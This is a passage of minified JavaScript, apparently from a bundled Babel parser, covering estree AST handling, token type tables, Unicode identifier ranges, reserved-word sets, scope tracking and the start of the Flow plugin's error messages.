W=this.state.lastTokStartLoc,G=super.parseExport(Q,Y);switch(G.type){case"ExportAllDeclaration":G.exported=null;break;case"ExportNamedDeclaration":if(G.specifiers.length===1&&G.specifiers[0].type==="ExportNamespaceSpecifier")this.castNodeTo(G,"ExportAllDeclaration"),G.exported=G.specifiers[0].exported,delete G.specifiers;case"ExportDefaultDeclaration":{var H;let{declaration:z}=G;if((z==null?void 0:z.type)==="ClassDeclaration"&&((H=z.decorators)==null?void 0:H.length)>0&&z.start===G.start)this.resetStartLocation(G,W)}break}return G}stopParseSubscript(Q,Y){let W=super.stopParseSubscript(Q,Y);if(Y.optionalChainMember)return this.estreeParseChainExpression(W,Q.loc.end);return W}parseMember(Q,Y,W,G,H){let z=super.parseMember(Q,Y,W,G,H);if(z.type==="OptionalMemberExpression")this.castNodeTo(z,"MemberExpression");else z.optional=!1;return z}isOptionalMemberExpression(Q){if(Q.type==="ChainExpression")return Q.expression.type==="MemberExpression";return super.isOptionalMemberExpression(Q)}hasPropertyAsPrivateName(Q){if(Q.type==="ChainExpression")Q=Q.expression;return super.hasPropertyAsPrivateName(Q)}isObjectProperty(Q){return Q.type==="Property"&&Q.kind==="init"&&!Q.method}isObjectMethod(Q){return Q.type==="Property"&&(Q.method||Q.kind==="get"||Q.kind==="set")}castNodeTo(Q,Y){let W=super.castNodeTo(Q,Y);return this.fillOptionalPropertiesForTSESLint(W),W}cloneIdentifier(Q){let Y=super.cloneIdentifier(Q);return this.fillOptionalPropertiesForTSESLint(Y),Y}cloneStringLiteral(Q){if(Q.type==="Literal")return this.cloneEstreeStringLiteral(Q);return super.cloneStringLiteral(Q)}finishNodeAt(Q,Y,W){return yJ(super.finishNodeAt(Q,Y,W))}finishNode(Q,Y){let W=super.finishNode(Q,Y);return this.fillOptionalPropertiesForTSESLint(W),W}resetStartLocation(Q,Y){super.resetStartLocation(Q,Y),yJ(Q)}resetEndLocation(Q,Y=this.state.lastTokEndLoc){super.resetEndLocation(Q,Y),yJ(Q)}};class b8{constructor(X,J){this.token=void 0,this.preserveSpace=void 0,this.token=X,this.preserveSpace=!!J}}var e1={brace:new b8("{"),j_oTag:new b8("<tag"),j_cTag:new b8("</tag"),j_expr:new b8("<tag>...</tag>",!0)};e1.template=new b8("`",!0);var g1=!0,G1=!0,D2=!0,gJ=!0,JX=!0,LP=!0;class T2{constructor(X,J={}){this.label=void 0,this.keyword=void 0,this.beforeExpr=void 0,this.startsExpr=void 0,this.rightAssociative=void 0,this.isLoop=void 0,this.isAssign=void 0,this.prefix=void 0,this.postfix=void 0,this.binop=void 0,this.label=X,this.keyword=J.keyword,this.beforeExpr=!!J.beforeExpr,this.startsExpr=!!J.startsExpr,this.rightAssociative=!!J.rightAssociative,this.isLoop=!!J.isLoop,this.isAssign=!!J.isAssign,this.prefix=!!J.prefix,this.postfix=!!J.postfix,this.binop=J.binop!=null?J.binop:null,this.updateContext=null}}var _2=new Map;function n1(X,J={}){J.keyword=X;let Q=O1(X,J);return _2.set(X,Q),Q}function r0(X,J){return O1(X,{beforeExpr:g1,binop:J})}var lJ=-1,T6=[],E2=[],k2=[],b2=[],v2=[],f2=[];function O1(X,J={}){var Q,Y,W,G;return++lJ,E2.push(X),k2.push((Q=J.binop)!=null?Q:-1),b2.push((Y=J.beforeExpr)!=null?Y:!1),v2.push((W=J.startsExpr)!=null?W:!1),f2.push((G=J.prefix)!=null?G:!1),T6.push(new T2(X,J)),lJ}function l1(X,J={}){var Q,Y,W,G;return++lJ,_2.set(X,lJ),E2.push(X),k2.push((Q=J.binop)!=null?Q:-1),b2.push((Y=J.beforeExpr)!=null?Y:!1),v2.push((W=J.startsExpr)!=null?W:!1),f2.push((G=J.prefix)!=null?G:!1),T6.push(new T2("name",J)),lJ}var IP={bracketL:O1("[",{beforeExpr:g1,startsExpr:G1}),bracketHashL:O1("#[",{beforeExpr:g1,startsExpr:G1}),bracketBarL:O1("[|",{beforeExpr:g1,startsExpr:G1}),bracketR:O1("]"),bracketBarR:O1("|]"),braceL:O1("{",{beforeExpr:g1,startsExpr:G1}),braceBarL:O1("{|",{beforeExpr:g1,startsExpr:G1}),braceHashL:O1("#{",{beforeExpr:g1,startsExpr:G1}),braceR:O1("}"),braceBarR:O1("|}"),parenL:O1("(",{beforeExpr:g1,startsExpr:G1}),parenR:O1(")"),comma:O1(",",{beforeExpr:g1}),semi:O1(";",{beforeExpr:g1}),colon:O1(":",{beforeExpr:g1}),doubleColon:O1("::",{beforeExpr:g1}),dot:O1("."),question:O1("?",{beforeExpr:g1}),questionDot:O1("?."),arrow:O1("=>",{beforeExpr:g1}),template:O1("template"),ellipsis:O1("...",{beforeExpr:g1}),backQuote:O1("`",{startsExpr:G1}),dollarBraceL:O1("${",{beforeExpr:g1,startsExpr:G1}),templateTail:O1("...`",{startsExpr:G1}),templateNonTail:O1("...${",{beforeExpr:g1,startsExpr:G1}),at:O1("@"),hash:O1("#",{startsExpr:G1}),interpreterDirective:O1("#!..."),eq:O1("=",{beforeExpr:g1,isAssign:gJ}),assign:O1("_=",{beforeExpr:g1,isAssign:gJ}),slashAssign:O1("_=",{beforeExpr:g1,isAssign:gJ}),xorAssign:O1("_=",{beforeExpr:g1,isAssign:gJ}),moduloAssign:O1("_=",{beforeExpr:g1,isAssign:gJ}),incDec:O1("++/--",{prefix:JX,postfix:LP,startsExpr:G1}),bang:O1("!",{beforeExpr:g1,prefix:JX,startsExpr:G1}),tilde:O1("~",{beforeExpr:g1,prefix:JX,startsExpr:G1}),doubleCaret:O1("^^",{startsExpr:G1}),doubleAt:O1("@@",{startsExpr:G1}),pipeline:r0("|>",0),nullishCoalescing:r0("??",1),logicalOR:r0("||",1),logicalAND:r0("&&",2),bitwiseOR:r0("|",3),bitwiseXOR:r0("^",4),bitwiseAND:r0("&",5),equality:r0("==/!=/===/!==",6),lt:r0("</>/<=/>=",7),gt:r0("</>/<=/>=",7),relational:r0("</>/<=/>=",7),bitShift:r0("<</>>/>>>",8),bitShiftL:r0("<</>>/>>>",8),bitShiftR:r0("<</>>/>>>",8),plusMin:O1("+/-",{beforeExpr:g1,binop:9,prefix:JX,startsExpr:G1}),modulo:O1("%",{binop:10,startsExpr:G1}),star:O1("*",{binop:10}),slash:r0("/",10),exponent:O1("**",{beforeExpr:g1,binop:11,rightAssociative:!0}),_in:n1("in",{beforeExpr:g1,binop:7}),_instanceof:n1("instanceof",{beforeExpr:g1,binop:7}),_break:n1("break"),_case:n1("case",{beforeExpr:g1}),_catch:n1("catch"),_continue:n1("continue"),_debugger:n1("debugger"),_default:n1("default",{beforeExpr:g1}),_else:n1("else",{beforeExpr:g1}),_finally:n1("finally"),_function:n1("function",{startsExpr:G1}),_if:n1("if"),_return:n1("return",{beforeExpr:g1}),_switch:n1("switch"),_throw:n1("throw",{beforeExpr:g1,prefix:JX,startsExpr:G1}),_try:n1("try"),_var:n1("var"),_const:n1("const"),_with:n1("with"),_new:n1("new",{beforeExpr:g1,startsExpr:G1}),_this:n1("this",{startsExpr:G1}),_super:n1("super",{startsExpr:G1}),_class:n1("class",{startsExpr:G1}),_extends:n1("extends",{beforeExpr:g1}),_export:n1("export"),_import:n1("import",{startsExpr:G1}),_null:n1("null",{startsExpr:G1}),_true:n1("true",{startsExpr:G1}),_false:n1("false",{startsExpr:G1}),_typeof:n1("typeof",{beforeExpr:g1,prefix:JX,startsExpr:G1}),_void:n1("void",{beforeExpr:g1,prefix:JX,startsExpr:G1}),_delete:n1("delete",{beforeExpr:g1,prefix:JX,startsExpr:G1}),_do:n1("do",{isLoop:D2,beforeExpr:g1}),_for:n1("for",{isLoop:D2}),_while:n1("while",{isLoop:D2}),_as:l1("as",{startsExpr:G1}),_assert:l1("assert",{startsExpr:G1}),_async:l1("async",{startsExpr:G1}),_await:l1("await",{startsExpr:G1}),_defer:l1("defer",{startsExpr:G1}),_from:l1("from",{startsExpr:G1}),_get:l1("get",{startsExpr:G1}),_let:l1("let",{startsExpr:G1}),_meta:l1("meta",{startsExpr:G1}),_of:l1("of",{startsExpr:G1}),_sent:l1("sent",{startsExpr:G1}),_set:l1("set",{startsExpr:G1}),_source:l1("source",{startsExpr:G1}),_static:l1("static",{startsExpr:G1}),_using:l1("using",{startsExpr:G1}),_yield:l1("yield",{startsExpr:G1}),_asserts:l1("asserts",{startsExpr:G1}),_checks:l1("checks",{startsExpr:G1}),_exports:l1("exports",{startsExpr:G1}),_global:l1("global",{startsExpr:G1}),_implements:l1("implements",{startsExpr:G1}),_intrinsic:l1("intrinsic",{startsExpr:G1}),_infer:l1("infer",{startsExpr:G1}),_is:l1("is",{startsExpr:G1}),_mixins:l1("mixins",{startsExpr:G1}),_proto:l1("proto",{startsExpr:G1}),_require:l1("require",{startsExpr:G1}),_satisfies:l1("satisfies",{startsExpr:G1}),_keyof:l1("keyof",{startsExpr:G1}),_readonly:l1("readonly",{startsExpr:G1}),_unique:l1("unique",{startsExpr:G1}),_abstract:l1("abstract",{startsExpr:G1}),_declare:l1("declare",{startsExpr:G1}),_enum:l1("enum",{startsExpr:G1}),_module:l1("module",{startsExpr:G1}),_namespace:l1("namespace",{startsExpr:G1}),_interface:l1("interface",{startsExpr:G1}),_type:l1("type",{startsExpr:G1}),_opaque:l1("opaque",{startsExpr:G1}),name:O1("name",{startsExpr:G1}),placeholder:O1("%%",{startsExpr:G1}),string:O1("string",{startsExpr:G1}),num:O1("num",{startsExpr:G1}),bigint:O1("bigint",{startsExpr:G1}),decimal:O1("decimal",{startsExpr:G1}),regexp:O1("regexp",{startsExpr:G1}),privateName:O1("#name",{startsExpr:G1}),eof:O1("eof"),jsxName:O1("jsxName"),jsxText:O1("jsxText",{beforeExpr:g1}),jsxTagStart:O1("jsxTagStart",{startsExpr:G1}),jsxTagEnd:O1("jsxTagEnd")};function W0(X){return X>=93&&X<=133}function CP(X){return X<=92}function u9(X){return X>=58&&X<=133}function g$(X){return X>=58&&X<=137}function PP(X){return b2[X]}function uJ(X){return v2[X]}function SP(X){return X>=29&&X<=33}function S$(X){return X>=129&&X<=131}function TP(X){return X>=90&&X<=92}function x2(X){return X>=58&&X<=92}function _P(X){return X>=39&&X<=59}function EP(X){return X===34}function kP(X){return f2[X]}function bP(X){return X>=121&&X<=123}function vP(X){return X>=124&&X<=130}function WX(X){return E2[X]}function b5(X){return k2[X]}function fP(X){return X===57}function f5(X){return X>=24&&X<=25}function P6(X){return T6[X]}T6[8].updateContext=(X)=>{X.pop()},T6[5].updateContext=T6[7].updateContext=T6[23].updateContext=(X)=>{X.push(e1.brace)},T6[22].updateContext=(X)=>{if(X[X.length-1]===e1.template)X.pop();else X.push(e1.template)},T6[143].updateContext=(X)=>{X.push(e1.j_expr,e1.j_oTag)};var h2="ªµºÀ-ÖØ-öø-ˁˆ-ˑˠ-ˤˬˮͰ-ʹͶͷͺ-ͽͿΆΈ-ΊΌΎ-ΡΣ-ϵϷ-ҁҊ-ԯԱ-Ֆՙՠ-ֈא-תׯ-ײؠ-يٮٯٱ-ۓەۥۦۮۯۺ-ۼۿܐܒ-ܯݍ-ޥޱߊ-ߪߴߵߺࠀ-ࠕࠚࠤࠨࡀ-ࡘࡠ-ࡪࡰ-ࢇࢉ-ࢎࢠ-ࣉऄ-हऽॐक़-ॡॱ-ঀঅ-ঌএঐও-নপ-রলশ-হঽৎড়ঢ়য়-ৡৰৱৼਅ-ਊਏਐਓ-ਨਪ-ਰਲਲ਼ਵਸ਼ਸਹਖ਼-ੜਫ਼ੲ-ੴઅ-ઍએ-ઑઓ-નપ-રલળવ-હઽૐૠૡૹଅ-ଌଏଐଓ-ନପ-ରଲଳଵ-ହଽଡ଼ଢ଼ୟ-ୡୱஃஅ-ஊஎ-ஐஒ-கஙசஜஞடணதந-பம-ஹௐఅ-ఌఎ-ఐఒ-నప-హఽౘ-ౚౝౠౡಀಅ-ಌಎ-ಐಒ-ನಪ-ಳವ-ಹಽೝೞೠೡೱೲഄ-ഌഎ-ഐഒ-ഺഽൎൔ-ൖൟ-ൡൺ-ൿඅ-ඖක-නඳ-රලව-ෆก-ะาำเ-ๆກຂຄຆ-ຊຌ-ຣລວ-ະາຳຽເ-ໄໆໜ-ໟༀཀ-ཇཉ-ཬྈ-ྌက-ဪဿၐ-ၕၚ-ၝၡၥၦၮ-ၰၵ-ႁႎႠ-ჅჇჍა-ჺჼ-ቈቊ-ቍቐ-ቖቘቚ-ቝበ-ኈኊ-ኍነ-ኰኲ-ኵኸ-ኾዀዂ-ዅወ-ዖዘ-ጐጒ-ጕጘ-ፚᎀ-ᎏᎠ-Ᏽᏸ-ᏽᐁ-ᙬᙯ-ᙿᚁ-ᚚᚠ-ᛪᛮ-ᛸᜀ-ᜑᜟ-ᜱᝀ-ᝑᝠ-ᝬᝮ-ᝰក-ឳៗៜᠠ-ᡸᢀ-ᢨᢪᢰ-ᣵᤀ-ᤞᥐ-ᥭᥰ-ᥴᦀ-ᦫᦰ-ᧉᨀ-ᨖᨠ-ᩔᪧᬅ-ᬳᭅ-ᭌᮃ-ᮠᮮᮯᮺ-ᯥᰀ-ᰣᱍ-ᱏᱚ-ᱽᲀ-ᲊᲐ-ᲺᲽ-Ჿᳩ-ᳬᳮ-ᳳᳵᳶᳺᴀ-ᶿḀ-ἕἘ-Ἕἠ-ὅὈ-Ὅὐ-ὗὙὛὝὟ-ώᾀ-ᾴᾶ-ᾼιῂ-ῄῆ-ῌῐ-ΐῖ-Ίῠ-Ῥῲ-ῴῶ-ῼⁱⁿₐ-ₜℂℇℊ-ℓℕ℘-ℝℤΩℨK-ℹℼ-ℿⅅ-ⅉⅎⅠ-ↈⰀ-ⳤⳫ-ⳮⳲⳳⴀ-ⴥⴧⴭⴰ-ⵧⵯⶀ-ⶖⶠ-ⶦⶨ-ⶮⶰ-ⶶⶸ-ⶾⷀ-ⷆⷈ-ⷎⷐ-ⷖⷘ-ⷞ々-〇〡-〩〱-〵〸-〼ぁ-ゖ゛-ゟァ-ヺー-ヿㄅ-ㄯㄱ-ㆎㆠ-ㆿㇰ-ㇿ㐀-䶿一-ꒌꓐ-ꓽꔀ-ꘌꘐ-ꘟꘪꘫꙀ-ꙮꙿ-ꚝꚠ-ꛯꜗ-ꜟꜢ-ꞈꞋ-ꟍꟐꟑꟓꟕ-Ƛꟲ-ꠁꠃ-ꠅꠇ-ꠊꠌ-ꠢꡀ-ꡳꢂ-ꢳꣲ-ꣷꣻꣽꣾꤊ-ꤥꤰ-ꥆꥠ-ꥼꦄ-ꦲꧏꧠ-ꧤꧦ-ꧯꧺ-ꧾꨀ-ꨨꩀ-ꩂꩄ-ꩋꩠ-ꩶꩺꩾ-ꪯꪱꪵꪶꪹ-ꪽꫀꫂꫛ-ꫝꫠ-ꫪꫲ-ꫴꬁ-ꬆꬉ-ꬎꬑ-ꬖꬠ-ꬦꬨ-ꬮꬰ-ꭚꭜ-ꭩꭰ-ꯢ가-힣ힰ-ퟆퟋ-ퟻ豈-舘並-龎ﬀ-ﬆﬓ-ﬗיִײַ-ﬨשׁ-זּטּ-לּמּנּסּףּפּצּ-ﮱﯓ-ﴽﵐ-ﶏﶒ-ﷇﷰ-ﷻﹰ-ﹴﹶ-ﻼＡ-Ｚａ-ｚｦ-ﾾￂ-ￇￊ-ￏￒ-ￗￚ-ￜ",m$="·̀-ͯ·҃-֑҇-ׇֽֿׁׂׅׄؐ-ًؚ-٩ٰۖ-ۜ۟-۪ۤۧۨ-ۭ۰-۹ܑܰ-݊ަ-ް߀-߉߫-߽߳ࠖ-࠙ࠛ-ࠣࠥ-ࠧࠩ-࡙࠭-࡛ࢗ-࢟࣊-ࣣ࣡-ःऺ-़ा-ॏ॑-ॗॢॣ०-९ঁ-ঃ়া-ৄেৈো-্ৗৢৣ০-৯৾ਁ-ਃ਼ਾ-ੂੇੈੋ-੍ੑ੦-ੱੵઁ-ઃ઼ા-ૅે-ૉો-્ૢૣ૦-૯ૺ-૿ଁ-ଃ଼ା-ୄେୈୋ-୍୕-ୗୢୣ୦-୯ஂா-ூெ-ைொ-்ௗ௦-௯ఀ-ఄ఼ా-ౄె-ైొ-్ౕౖౢౣ౦-౯ಁ-ಃ಼ಾ-ೄೆ-ೈೊ-್ೕೖೢೣ೦-೯ೳഀ-ഃ഻഼ാ-ൄെ-ൈൊ-്ൗൢൣ൦-൯ඁ-ඃ්ා-ුූෘ-ෟ෦-෯ෲෳัิ-ฺ็-๎๐-๙ັິ-ຼ່-໎໐-໙༘༙༠-༩༹༵༷༾༿ཱ-྄྆྇ྍ-ྗྙ-ྼ࿆ါ-ှ၀-၉ၖ-ၙၞ-ၠၢ-ၤၧ-ၭၱ-ၴႂ-ႍႏ-ႝ፝-፟፩-፱ᜒ-᜕ᜲ-᜴ᝒᝓᝲᝳ឴-៓៝០-៩᠋-᠍᠏-᠙ᢩᤠ-ᤫᤰ-᤻᥆-᥏᧐-᧚ᨗ-ᨛᩕ-ᩞ᩠-᩿᩼-᪉᪐-᪙᪰-᪽ᪿ-ᫎᬀ-ᬄ᬴-᭄᭐-᭙᭫-᭳ᮀ-ᮂᮡ-ᮭ᮰-᮹᯦-᯳ᰤ-᰷᱀-᱉᱐-᱙᳐-᳔᳒-᳨᳭᳴᳷-᳹᷀-᷿‌‍‿⁀⁔⃐-⃥⃜⃡-⃰⳯-⵿⳱ⷠ-〪ⷿ-゙゚〯・꘠-꘩꙯ꙴ-꙽ꚞꚟ꛰꛱ꠂ꠆ꠋꠣ-ꠧ꠬ꢀꢁꢴ-ꣅ꣐-꣙꣠-꣱ꣿ-꤉ꤦ-꤭ꥇ-꥓ꦀ-ꦃ꦳-꧀꧐-꧙ꧥ꧰-꧹ꨩ-ꨶꩃꩌꩍ꩐-꩙ꩻ-ꩽꪰꪲ-ꪴꪷꪸꪾ꪿꫁ꫫ-ꫯꫵ꫶ꯣ-ꯪ꯬꯭꯰-꯹ﬞ︀-️︠-︯︳︴﹍-﹏０-９＿･",xP=new RegExp("["+h2+"]"),hP=new RegExp("["+h2+m$+"]");h2=m$=null;var u$=[0,11,2,25,2,18,2,1,2,14,3,13,35,122,70,52,268,28,4,48,48,31,14,29,6,37,11,29,3,35,5,7,2,4,43,157,19,35,5,35,5,39,9,51,13,10,2,14,2,6,2,1,2,10,2,14,2,6,2,1,4,51,13,310,10,21,11,7,25,5,2,41,2,8,70,5,3,0,2,43,2,1,4,0,3,22,11,22,10,30,66,18,2,1,11,21,11,25,71,55,7,1,65,0,16,3,2,2,2,28,43,28,4,28,36,7,2,27,28,53,11,21,11,18,14,17,111,72,56,50,14,50,14,35,39,27,10,22,251,41,7,1,17,2,60,28,11,0,9,21,43,17,47,20,28,22,13,52,58,1,3,0,14,44,33,24,27,35,30,0,3,0,9,34,4,0,13,47,15,3,22,0,2,0,36,17,2,24,20,1,64,6,2,0,2,3,2,14,2,9,8,46,39,7,3,1,3,21,2,6,2,1,2,4,4,0,19,0,13,4,31,9,2,0,3,0,2,37,2,0,26,0,2,0,45,52,19,3,21,2,31,47,21,1,2,0,185,46,42,3,37,47,21,0,60,42,14,0,72,26,38,6,186,43,117,63,32,7,3,0,3,7,2,1,2,23,16,0,2,0,95,7,3,38,17,0,2,0,29,0,11,39,8,0,22,0,12,45,20,0,19,72,200,32,32,8,2,36,18,0,50,29,113,6,2,1,2,37,22,0,26,5,2,1,2,31,15,0,328,18,16,0,2,12,2,33,125,0,80,921,103,110,18,195,2637,96,16,1071,18,5,26,3994,6,582,6842,29,1763,568,8,30,18,78,18,29,19,47,17,3,32,20,6,18,433,44,212,63,129,74,6,0,67,12,65,1,2,0,29,6135,9,1237,42,9,8936,3,2,6,2,1,2,290,16,0,30,2,3,0,15,3,9,395,2309,106,6,12,4,8,8,9,5991,84,2,70,2,1,3,0,3,1,3,3,2,11,2,0,2,6,2,64,2,3,3,7,2,6,2,27,2,3,2,4,2,0,4,6,2,339,3,24,2,24,2,30,2,24,2,30,2,24,2,30,2,24,2,30,2,24,2,7,1845,30,7,5,262,61,147,44,11,6,17,0,322,29,19,43,485,27,229,29,3,0,496,6,2,3,2,1,2,14,2,196,60,67,8,0,1205,3,2,26,2,1,2,0,3,0,2,9,2,3,2,0,2,0,7,0,5,0,2,0,2,0,2,2,2,1,2,0,3,0,2,0,2,0,2,0,2,0,2,1,2,0,3,3,2,6,2,3,2,3,2,0,2,9,2,16,6,2,2,4,2,16,4421,42719,33,4153,7,221,3,5761,15,7472,16,621,2467,541,1507,4938,6,4191],yP=[509,0,227,0,150,4,294,9,1368,2,2,1,6,3,41,2,5,0,166,1,574,3,9,9,7,9,32,4,318,1,80,3,71,10,50,3,123,2,54,14,32,10,3,1,11,3,46,10,8,0,46,9,7,2,37,13,2,9,6,1,45,0,13,2,49,13,9,3,2,11,83,11,7,0,3,0,158,11,6,9,7,3,56,1,2,6,3,1,3,2,10,0,11,1,3,6,4,4,68,8,2,0,3,0,2,3,2,4,2,0,15,1,83,17,10,9,5,0,82,19,13,9,214,6,3,8,28,1,83,16,16,9,82,12,9,9,7,19,58,14,5,9,243,14,166,9,71,5,2,1,3,3,2,0,2,1,13,9,120,6,3,6,4,0,29,9,41,6,2,3,9,0,10,10,47,15,343,9,54,7,2,7,17,9,57,21,2,13,123,5,4,0,2,1,2,6,2,0,9,9,49,4,2,1,2,4,9,9,330,3,10,1,2,0,49,6,4,4,14,10,5350,0,7,14,11465,27,2343,9,87,9,39,4,60,6,26,9,535,9,470,0,2,54,8,3,82,0,12,1,19628,1,4178,9,519,45,3,22,543,4,4,5,9,7,3,6,31,3,149,2,1418,49,513,54,5,49,9,0,15,0,23,4,2,14,1361,6,2,16,3,6,2,1,2,4,101,0,161,6,10,9,357,0,62,13,499,13,245,1,2,9,726,6,110,6,6,9,4759,9,787719,239];function C2(X,J){let Q=65536;for(let Y=0,W=J.length;Y<W;Y+=2){if(Q+=J[Y],Q>X)return!1;if(Q+=J[Y+1],Q>=X)return!0}return!1}function _6(X){if(X<65)return X===36;if(X<=90)return!0;if(X<97)return X===95;if(X<=122)return!0;if(X<=65535)return X>=170&&xP.test(String.fromCharCode(X));return C2(X,u$)}function f8(X){if(X<48)return X===36;if(X<58)return!0;if(X<65)return!1;if(X<=90)return!0;if(X<97)return X===95;if(X<=122)return!0;if(X<=65535)return X>=170&&hP.test(String.fromCharCode(X));return C2(X,u$)||C2(X,yP)}var y2={keyword:["break","case","catch","continue","debugger","default","do","else","finally","for","function","if","return","switch","throw","try","var","const","while","with","new","this","super","class","extends","export","import","null","true","false","in","instanceof","typeof","void","delete"],strict:["implements","interface","let","package","private","protected","public","static","yield"],strictBind:["eval","arguments"]},gP=new Set(y2.keyword),mP=new Set(y2.strict),uP=new Set(y2.strictBind);function c$(X,J){return J&&X==="await"||X==="enum"}function l$(X,J){return c$(X,J)||mP.has(X)}function p$(X){return uP.has(X)}function d$(X,J){return l$(X,J)||p$(X)}function cP(X){return gP.has(X)}function lP(X,J,Q){return X===64&&J===64&&_6(Q)}var pP=new Set(["break","case","catch","continue","debugger","default","do","else","finally","for","function","if","return","switch","throw","try","var","const","while","with","new","this","super","class","extends","export","import","null","true","false","in","instanceof","typeof","void","delete","implements","interface","let","package","private","protected","public","static","yield","eval","arguments","enum","await"]);function dP(X){return pP.has(X)}class x5{constructor(X){this.flags=0,this.names=new Map,this.firstLexicalName="",this.flags=X}}class h5{constructor(X,J){this.parser=void 0,this.scopeStack=[],this.inModule=void 0,this.undefinedExports=new Map,this.parser=X,this.inModule=J}get inTopLevel(){return(this.currentScope().flags&1)>0}get inFunction(){return(this.currentVarScopeFlags()&2)>0}get allowSuper(){return(this.currentThisScopeFlags()&16)>0}get allowDirectSuper(){return(this.currentThisScopeFlags()&32)>0}get allowNewTarget(){return(this.currentThisScopeFlags()&512)>0}get inClass(){return(this.currentThisScopeFlags()&64)>0}get inClassAndNotInNonArrowFunction(){let X=this.currentThisScopeFlags();return(X&64)>0&&(X&2)===0}get inStaticBlock(){for(let X=this.scopeStack.length-1;;X--){let{flags:J}=this.scopeStack[X];if(J&128)return!0;if(J&1731)return!1}}get inNonArrowFunction(){return(this.currentThisScopeFlags()&2)>0}get inBareCaseStatement(){return(this.currentScope().flags&256)>0}get treatFunctionsAsVar(){return this.treatFunctionsAsVarInScope(this.currentScope())}createScope(X){return new x5(X)}enter(X){this.scopeStack.push(this.createScope(X))}exit(){return this.scopeStack.pop().flags}treatFunctionsAsVarInScope(X){return!!(X.flags&130||!this.parser.inModule&&X.flags&1)}declareName(X,J,Q){let Y=this.currentScope();if(J&8||J&16){this.checkRedeclarationInScope(Y,X,J,Q);let W=Y.names.get(X)||0;if(J&16)W=W|4;else{if(!Y.firstLexicalName)Y.firstLexicalName=X;W=W|2}if(Y.names.set(X,W),J&8)this.maybeExportDefined(Y,X)}else if(J&4){for(let W=this.scopeStack.length-1;W>=0;--W)if(Y=this.scopeStack[W],this.checkRedeclarationInScope(Y,X,J,Q),Y.names.set(X,(Y.names.get(X)||0)|1),this.maybeExportDefined(Y,X),Y.flags&1667)break}if(this.parser.inModule&&Y.flags&1)this.undefinedExports.delete(X)}maybeExportDefined(X,J){if(this.parser.inModule&&X.flags&1)this.undefinedExports.delete(J)}checkRedeclarationInScope(X,J,Q,Y){if(this.isRedeclaredInScope(X,J,Q))this.parser.raise(S.VarRedeclaration,Y,{identifierName:J})}isRedeclaredInScope(X,J,Q){if(!(Q&1))return!1;if(Q&8)return X.names.has(J);let Y=X.names.get(J);if(Q&16)return(Y&2)>0||!this.treatFunctionsAsVarInScope(X)&&(Y&1)>0;return(Y&2)>0&&!(X.flags&8&&X.firstLexicalName===J)||!this.treatFunctionsAsVarInScope(X)&&(Y&4)>0}checkLocalExport(X){let{name:J}=X;if(!this.scopeStack[0].names.has(J))this.undefinedExports.set(J,X.loc.start)}currentScope(){return this.scopeStack[this.scopeStack.length-1]}currentVarScopeFlags(){for(let X=this.scopeStack.length-1;;X--){let{flags:J}=this.scopeStack[X];if(J&1667)return J}}currentThisScopeFlags(){for(let X=this.scopeStack.length-1;;X--){let{flags:J}=this.scopeStack[X];if(J&1731&&!(J&4))return J}}}class i$ extends x5{constructor(...X){super(...X);this.declareFunctions=new Set}}class r$ extends h5{createScope(X){return new i$(X)}declareName(X,J,Q){let Y=this.currentScope();if(J&2048){this.checkRedeclarationInScope(Y,X,J,Q),this.maybeExportDefined(Y,X),Y.declareFunctions.add(X);return}super.declareName(X,J,Q)}isRedeclaredInScope(X,J,Q){if(super.isRedeclaredInScope(X,J,Q))return!0;if(Q&2048&&!X.declareFunctions.has(J)){let Y=X.names.get(J);return(Y&4)>0||(Y&2)>0}return!1}checkLocalExport(X){if(!this.scopeStack[0].declareFunctions.has(X.name))super.checkLocalExport(X)}}var iP=new Set(["_","any","bool","boolean","empty","extends","false","interface","mixed","null","number","static","string","true","typeof","void"]),A1=G6`flow`({AmbiguousConditionalArrow:"Ambiguous expression: wrap the arrow functions in parentheses to disambiguate.",AmbiguousDeclareModuleKind:"Found both `declare module.exports` and `declare export` in the same module. Modules can only have 1 since they are either an ES module or they are a CommonJS module.",AssignReservedType:({reservedType:X})=>`Cannot overwrite reserved type ${X}.`,DeclareClassElement:"The `declare` modifier can only appear on class fields.",DeclareClassFieldInitializer:"Initializers are not allowed in fields with the `declare` modifier.",DuplicateDeclareModuleExports:"Duplicate `declare module.exports` statement.",EnumBooleanMemberNotInitialized:({memberName:X,enumName:J})=>`Boolean enum members need to be initialized. Use either \`${X} = true,\` or \`${X} = false,\` in enum \`${J}\`.`,EnumDuplicateMemberName:({memberName:X,enumName:J})=>`Enum member names need to be unique, but the name \`${X}\` has already been used before in enum \`${J}\`.`,EnumInconsistentMemberValues:({enumName:X})=>`Enum \`${X}\` has inconsistent member initializers. Either use no initializers, or consistently use literals (either booleans, numbers, or strings) for all member initializers.`,EnumInvalidExplicitType:({invalidEnumType:X,enumName:J})=>`Enum type \`${X}\` is not valid. Use one of \`boolean\`, \`number\`, \`string\`, or \`symbol\` in enum \`${J}\`.`,EnumInvalidExplicitTypeUnknownSupplied:({enumName:X})=>`Supplied enum type is not valid. Use one of \`boolean\`, \`number\`, \`string\`, or \`symbol\` in enum \`${X}\`.`,EnumInvalidMemberInitializerPrimaryType:({enumName:X,memberName:J,explicitType:Q})=>`Enum \`${X}\` has type \`${Q}\`, so the initializer of \`${J}\` needs to be a ${Q} literal.`,EnumInvalidMemberInitializerSymbolType:({enumName:X,memberName:J})=>`Symbol enum members cannot be initialized. Use \`${J},\` in enum \`${X}\`.`,EnumInvalidMemberInitializerUnknownType:({enumName:X,memberName:J})=>`The enum member initializer for \`${J}\` needs to be a literal (either a boolean, number, or string) in enum \`${X}\`.`,EnumInvalidMemberName:({enumName:X,memberName:J,suggestion:Q})=>`Enum member names cannot start with lowercase 'a' through 'z'. Instead of using \`${J}\`, consider using \`${Q}\`, in enum \`${X}\`.`,EnumNumberMemberNotInitialized:({enumName:X,memberName:J})=>`Number enum members need to be initialized, e.g. \`${J} = 1\` in enum \`${X}\`.`,EnumStringMemberInconsistentlyInitialized:({enumName:X})=>`String enum members need to consistently either all use initializers, or use no initializers, in enum \`${X}\`.`,GetterMayNotHaveThisParam:"A getter cannot have a `this` parameter.",ImportReflectionHasImportType:"An `import module` declaration can not use `type` or `typeof` keyword.",ImportTypeShorthandOnlyInPureImport:"The `type` and `typeof` keywords on named imports can only be used on regular `import` statements. It cannot be used with `import type` or `import typeof` statements.",InexactInsideExact:"Explicit inexact syntax cannot appear inside an explicit exact object type.",InexactInsideNonObject:"Explicit inexact syntax cannot appear in class or interface definitions.",InexactVariance:"Explicit inexact syntax cannot have variance.",InvalidNonTypeImportInDeclareModule:"Imports within a `declare module` body must always be `import type` or `import typeof`.",MissingTypeParamDefault:"Type parameter declaration needs a default, since a preceding type parameter 